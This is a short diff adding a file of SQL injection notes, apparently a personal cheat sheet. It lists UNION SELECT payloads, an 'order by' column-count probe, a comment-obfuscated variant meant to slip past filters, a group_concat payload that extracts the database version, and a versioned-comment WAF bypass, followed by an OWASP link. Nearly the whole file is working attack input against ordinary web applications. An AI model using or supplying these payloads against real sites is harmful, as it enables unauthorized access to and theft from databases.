@@ -1,0 +1,12 @@
+
+order by 50
+0 union all select 1,2,3
+0/**/union/**/all/**/select/**/1,2,3
+
+0/**/union/**/all/**/select/**/1,2,group_concat("-X.25.X-",VERSION(),"-X.26.X-")
+
+
+
+
+bypass waf:/*!50000select*/
+https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF
